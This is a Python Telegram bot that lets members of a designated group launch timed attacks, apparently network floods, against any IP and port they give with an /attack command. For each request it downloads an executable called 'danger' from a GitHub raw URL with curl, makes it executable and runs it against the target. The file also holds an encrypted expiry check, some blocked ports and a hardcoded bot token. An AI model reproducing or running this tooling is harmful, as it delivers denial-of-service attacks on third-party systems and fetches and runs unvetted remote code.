import os
import sys
import telebot
import logging
import time
import asyncio
from threading import Thread
from datetime import datetime
import pytz
from cryptography.fernet import Fernet

# Your encryption key
ENCRYPTION_KEY = b'zYKalLO_6aO8Ui3BVtWf14_UYY57vXfPFG1iKpbZg38='
cipher = Fernet(ENCRYPTION_KEY)

# Encrypted expiration date
EXPIRATION_DATE_ENCRYPTED = b'gAAAAABnDQo8GNHr1NGOF7fuAaH-FagCDjgj6ChHgZ2FKL8MiLp601n179b0K4DV-_OVJqi8J3yon5zXtjPwVehCt40zzNDOKNtcB0Mns845zxa94ZOzlPI='

# Decrypt the expiration date
try:
    expiration_date_str = cipher.decrypt(EXPIRATION_DATE_ENCRYPTED).decode()
    EXPIRATION_DATE = datetime.strptime(expiration_date_str, '%Y-%m-%d %H:%M:%S').replace(tzinfo=pytz.utc)
except Exception as e:
    logging.error("Failed to decrypt expiration date: %s", e)
    sys.exit(1)

# Set timezone to IST
IST = pytz.timezone('Asia/Kolkata')

# Check if the current time is within the expiration date
def is_within_expiration():
    current_time_IST = datetime.now(IST)
    return current_time_IST <= EXPIRATION_DATE.astimezone(IST)

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = '6258485737:AAEve0vut5sJTw4cin8NexE_L-dRcb2ph8A'  # Replace with your actual bot token
bot = telebot.TeleBot(TOKEN)  # Initialize the bot

FORWARD_CHANNEL_ID = -1002172184452
CHANNEL_ID = -1002172184452
DESIGNATED_GROUP_ID = -1002271966296

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []
attack_in_progress = False
MAX_DURATION = 180  # Maximum allowed duration

async def run_attack_command_on_codespace(target_ip, target_port, duration):
    global attack_in_progress
    command = f"curl -sSL https://raw.githubusercontent.com/Gamewallah63/ninja/main/danger -o danger && chmod +x danger && ./danger {target_ip} {target_port} {duration} 70"
    try:
        attack_in_progress = True
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()

        # Decode output and error, handle decoding errors
        output = stdout.decode(errors='replace')
        error = stderr.decode(errors='replace')

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)
        attack_in_progress = False

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_async(target_ip, target_port, duration, chat_id):
    try:
        await run_attack_command_on_codespace(target_ip, target_port, duration)
        bot.send_message(chat_id, "*Attack command executed successfully.*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error during attack execution: {e}")
        bot.send_message(chat_id, "*An error occurred while executing the attack.*", parse_mode='Markdown')

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except:
        return False

def is_in_designated_group(chat_id):
    return chat_id == DESIGNATED_GROUP_ID

@bot.message_handler(func=lambda message: is_in_designated_group(message.chat.id))
def handle_commands(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_within_expiration():
        bot.send_message(chat_id, "*This command has expired. Please contact the administrator.*", parse_mode='Markdown')
        return

    if message.text.startswith('/attack'):
        attack_command(message)
    elif message.text.startswith('/approve') or message.text.startswith('/disapprove'):
        if not is_user_admin(user_id, CHANNEL_ID):
            bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
            return
        bot.send_message(chat_id, "*Approval system is disabled.*", parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_in_designated_group(chat_id):
        bot.send_message(chat_id, "*This bot can only be used in the designated group.*", parse_mode='Markdown')
        return

    if attack_in_progress:
        bot.send_message(chat_id, "*An attack is already in progress. Please wait until it ends.*", parse_mode='Markdown')
        return

    try:
        args = message.text.split()[1:]  # Get the args from the command
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: /attack <target_ip> <target_port> <duration>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

        if duration > MAX_DURATION:
            bot.send_message(chat_id, "*Error: Time limit is 180 seconds.*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"*Attack started ⚡\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
        bot.send_message(chat_id, "*Failed to process the attack command.*", parse_mode='Markdown')

def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

if __name__ == "__main__":
    loop = asyncio.get_event_loop()  # Initialize the asyncio event loop
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Codespace activity keeper and Telegram bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        time.sleep(REQUEST_INTERVAL)
